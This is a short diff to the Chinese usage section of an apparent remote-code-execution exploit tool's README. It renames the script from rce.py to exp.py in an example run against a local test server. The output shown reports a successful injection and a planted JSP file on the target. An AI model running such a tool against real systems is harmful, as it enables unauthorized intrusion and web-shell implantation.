@@ -33,7 +33,7 @@ optional arguments:
 比如：
 
 ```bash
-$ python3 rce.py --url http://127.0.0.1:8082/helloworld/greeting --type 1 --proxy http://127.0.0.1:8080
+$ python3 exp.py --url http://127.0.0.1:8082/helloworld/greeting --type 1 --proxy http://127.0.0.1:8080
 [*] waiting for 10s...
 [+] inject success, vulnerable!
 [+] test at: http://127.0.0.1:8082/inject30297.jsp
